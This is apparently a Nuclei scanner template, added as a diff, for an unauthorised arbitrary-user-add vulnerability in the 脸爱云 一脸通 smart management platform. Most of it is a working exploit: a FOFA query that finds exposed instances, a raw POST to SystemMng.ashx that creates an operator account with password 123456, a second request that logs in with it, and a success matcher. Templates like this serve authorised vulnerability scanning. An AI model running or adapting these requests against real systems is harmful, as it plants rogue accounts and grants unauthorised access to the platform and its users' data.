@@ -1,0 +1,47 @@
+
+id: lianaiyun-yiliantong-SystemMng-useradd
+info:
+  name: 脸爱云 一脸通智慧管理平台任意用户添加漏洞
+  author: rain
+  severity: high
+  description: |
+    脸爱云 一脸通智慧管理平台存在严重漏洞，允许攻击者通过未经授权的访问，在系统中任意添加用户。攻击者可滥用此漏洞创建虚假账户，提升权限，或执行其他危险操作。成功利用漏洞可能导致未经授权的系统访问，危及用户隐私和整体系统安全。为确保系统安全，强烈建议立即修复漏洞，加强用户添加功能的输入验证和访问控制，以限制仅授权用户能够执行此操作。
+  metadata:
+    fofa-query: title=="欢迎使用脸爱云 一脸通智慧管理平台"
+
+http:
+  - raw:
+      - | 
+        POST /SystemMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Connection: close
+        Cookie: ASP.NET_SessionId=whnrkuaqbz0lyv1fbwtzf23y
+        Upgrade-Insecure-Requests: 1
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 175
+
+        operatorName=test1&operatorPwd=123456&operpassword=123456&operatorRole=00&visible_jh=%E8%AF%B7%E9%80%89%E6%8B%A9&visible_dorm=%E8%AF%B7%E9%80%89%E6%8B%A9&funcName=addOperators
+      - | 
+        POST /SystemMng.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: uName=rs6NHOsENwI=; ASP.NET_SessionId=vc0efscjhrtrwr2a5rsdugbr
+        Accept-Language: zh-CN,zh;q=0.9
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+        Accept: */*
+        sec-ch-ua: "Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"
+        sec-ch-ua-mobile: ?0
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        sec-ch-ua-platform: "Windows"
+        Accept-Encoding: gzip, deflate
+        Content-Length: 48
+
+        name=test1&pwd=123456&keeps=0&funcName=UserLogin
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body_2,"1")'
